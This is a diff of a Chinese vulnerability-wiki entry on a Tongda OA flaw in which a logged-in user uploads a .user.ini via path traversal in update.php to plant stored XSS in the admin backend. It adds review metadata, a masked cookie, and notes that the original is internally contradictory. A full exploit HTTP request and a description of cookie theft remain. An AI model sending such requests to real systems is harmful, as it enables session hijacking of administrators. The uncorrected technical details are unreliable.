@@ -1,27 +1,67 @@
 ---
-version: "通达OA < v11.8"
 source: "Threekiii/Vulnerability-Wiki"
+title: "通达OA staff_info写.user.ini/XSS"
+product: "通达OA"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.6测试，11.8标题与<11.8矛盾"
+prerequisites: "登录且PHP支持.user.ini"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E.md"
+category_recommendation: "OA / 通达"
+id: "vw-6d4e9f21ea664ab85e10fb3a"
+entity_id: "ve-6d4e9f21ea664ab85e10fb3a"
+schema_version: "1"
 ---
 
-# 通达OA v11.8 update.php 后台文件包含XSS漏洞
+# 通达OA staff_info写.user.ini/XSS
 
-## 漏洞描述
+## 条目说明
+
+- 对象与具体问题：通达OA；staff_info写.user.ini/XSS
+- 版本、配置及部署条件：11.6测试，11.8标题与<11.8矛盾
+- 认证与权限前提：登录且PHP支持.user.ini
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 第一HTTP完整可补232；路径双包含解释错误
+- ini指定peiqi.log但USER_ID=test写test.log；内容PeiQi_Wiki却匹配test_Wiki，脚本自相矛盾
+- 标记输出不足证浏览器XSS；无清理
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+### 漏洞描述
 
 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息
 
-## 漏洞影响
+### 漏洞影响
 
 ```
 通达OA < v11.8
 ```
 
-## 环境搭建
+### 环境搭建
 
 [通达OA v11.6下载链接](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
 
 下载完毕点击安装即可
 
-## 漏洞复现
+### 漏洞复现
 
 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难
 
@@ -89,7 +129,7 @@ auto_prepend_file=test.log
 
 请求包为
 
-```plain
+```http
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1
 Host: 192.168.1.105
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -97,9 +137,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
-Content-Length: 365
 Connection: close
-Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31
+Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=k************************4; SID_1=a63eb31
 Upgrade-Insecure-Requests: 1
 
 -----------------------------17518323986548992951984057104
@@ -113,6 +152,8 @@ Content-Disposition: form-data; name="submit"
 提交
 -----------------------------17518323986548992951984057104--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 365；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 其中 **USER_ID=../../general/.user** 为上传路径
 
@@ -166,7 +207,7 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 
 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie
 
-## 漏洞POC
+### 漏洞POC
 
 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞
 
@@ -275,7 +316,7 @@ if __name__ == '__main__':
 ![image-20220209111615822](./.resource/通达OA-v11.8-update.php-后台文件包含XSS漏洞/media/202202091116959.png)
 
 
-## 参考文章
+### 参考文章
 
 https://paper.seebug.org/1499/
 
